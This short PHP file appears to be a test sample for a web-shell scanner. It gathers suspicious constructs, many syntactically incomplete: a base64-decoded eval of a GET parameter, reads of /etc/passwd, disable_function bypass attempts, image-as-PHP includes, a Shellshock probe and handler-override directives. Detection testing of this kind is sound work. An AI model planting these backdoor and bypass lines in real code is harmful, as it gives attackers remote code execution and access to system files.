<?php

curl_init  ( "file:///etc/parla");
curl_setopt($ch, CURLOPT_URL, "file:file:////etc/passwd");
set_magic_quotes_runtime ( 0);
eval(base64_decode($_GET['lol']));
$a= "SetHandler application/x-httpd-php";
$b = "IIS://localhost/w3svc";
include  ( 'lol.png');
ini_get (  'disable_function');
ini_set("disable_function", "");
ini_restore("allow_url_include");
preg_replace ("/*/e");
$c = "env x='() { :;}; echo vulnerable' bash -c 'echo this is a test'";
fsockopen (  'udp://');
call_user_func('LOL');
$d = "<!--#exec cmd=";
$c = "AddType application/x-httpd-php .htaccess"
